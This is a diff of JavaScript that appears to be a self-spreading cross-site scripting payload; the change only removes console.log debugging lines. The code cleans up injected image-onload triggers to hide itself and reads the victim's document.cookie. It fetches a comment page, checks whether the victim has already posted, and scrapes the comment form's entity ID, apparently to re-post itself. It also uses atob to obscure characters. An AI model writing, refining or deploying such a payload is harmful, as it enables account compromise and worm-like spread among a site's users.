@@ -1,6 +1,5 @@
 (async function() {
     const imgs = document.querySelectorAll('img[i]');
-    console.log(imgs);
     for (const img of imgs) {
         img.removeAttribute('onload');
         img.removeAttribute('i');
@@ -9,7 +8,6 @@
             img.remove();
             document.querySelector('.preview-image').remove();
         }
-        console.log(img);
     }
 
     const cookie = document.cookie;
@@ -65,7 +63,7 @@
         const text2 = await commentP.text();
         if (text2.includes(`href="/profile/${profileId} d"`)) return;
         const m = text2.match(/form id="comment-form" class="comment-box" action="\/comment\/default\/create\?entity=(.+)" method="post"/);
-        if (!m) return console.log('ncf');
+        if (!m) return;
         const e = m[1];
     
         const amp = atob('Jg==');
